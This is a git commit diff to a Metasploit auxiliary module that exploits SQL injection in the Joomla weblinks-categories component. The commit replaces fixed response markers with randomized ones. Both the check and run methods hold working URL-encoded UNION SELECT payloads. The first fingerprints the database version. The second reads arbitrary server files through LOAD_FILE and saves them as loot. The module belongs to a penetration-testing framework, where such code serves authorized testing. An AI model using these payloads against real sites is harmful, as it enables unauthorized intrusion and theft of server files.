7540dd83ebe099e7b7f329284fb4e28cee4d32c4
Brandon Perry <bperry.volatile@gmail.com>
2014-03-12 20:11:55 -0500

    randomize markers

--- modules/auxiliary/gather/joomla_weblinks_sqli.rb
+++ modules/auxiliary/gather/joomla_weblinks_sqli.rb
@@ -41,9 +41,14 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def check
+
+    front_marker = Rex::Text.rand_text_alpha(6)
+    back_marker = Rex::Text.rand_text_alpha(6)
+
     payload = datastore['CATEGORYID'].to_s
-    payload << "%29%20UNION%20ALL%20SELECT%20CONCAT%280x71636f7471%2CIFNULL%28CAST%28VERSION%28%29%20"
-    payload << "AS%20CHAR%29%2C0x20%29%2C0x7165776271%29%23"
+    payload << "%29%20UNION%20ALL%20SELECT%20CONCAT%280x#{front_marker.unpack('H*')[0]}%2C"
+    payload << "IFNULL%28CAST%28VERSION%28%29%20"
+    payload << "AS%20CHAR%29%2C0x20%29%2C0x#{back_marker.unpack('H*')[0]}%29%23"
 
     resp = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, '/index.php/weblinks-categories?id=' + payload)
@@ -53,24 +58,27 @@ class Metasploit3 < Msf::Auxiliary
       return Exploit::CheckCode::Safe
     end
 
-    version = /qcotq(.*)qewbq/.match(resp.body)
+    version = /#{front_marker}(.*)#{back_marker}/.match(resp.body)
 
     if !version
       return Exploit::CheckCode::Safe
     end
 
-    version = version[1].gsub('qcotq', '').gsub('qewbq', '')
+    version = version[1].gsub(front_marker, '').gsub(back_marker, '')
     print_good("Fingerprinted: #{version}")
     return Exploit::CheckCode::Vulnerable
   end
 
   def run
+    front_marker = Rex::Text.rand_text_alpha(6)
+    back_marker = Rex::Text.rand_text_alpha(6)
     file = datastore['FILEPATH'].unpack("H*")[0]
     catid = datastore['CATEGORYID']
 
     payload = catid.to_s 
-    payload << "%29%20UNION%20ALL%20SELECT%20CONCAT%280x7163756871%2CIFNULL%28CAST%28HEX%28LOAD_FILE%28"
-    payload << "0x#{file}%29%29%20AS%20CHAR%29%2C0x20%29%2C0x716f687671%29%23"
+    payload << "%29%20UNION%20ALL%20SELECT%20CONCAT%280x#{front_marker.unpack('H*')[0]}"
+    payload << "%2CIFNULL%28CAST%28HEX%28LOAD_FILE%28"
+    payload << "0x#{file}%29%29%20AS%20CHAR%29%2C0x20%29%2C0x#{back_marker.unpack('H*')[0]}%29%23"
 
     resp = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, '/index.php/weblinks-categories?id=' + payload)
@@ -80,13 +88,13 @@ class Metasploit3 < Msf::Auxiliary
       fail_with("Server did not respond in an expected way. Verify the IP address.")
     end
 
-    file = /qcuhq(.*)qohvq/.match(resp.body)
+    file = /#{front_marker}(.*)#{back_marker}/.match(resp.body)
 
     if !file
       fail_with("Either the file didn't exist or the server has been patched.")
     end
 
-    file = file[1].gsub('qcuhq', '').gsub('qohvq', '')
+    file = file[1].gsub(front_marker, '').gsub(back_marker, '')
     file = [file].pack("H*")
 
     path = store_loot("joomla.file", "text/plain", datastore['RHOST'], file, datastore['FILEPATH'])
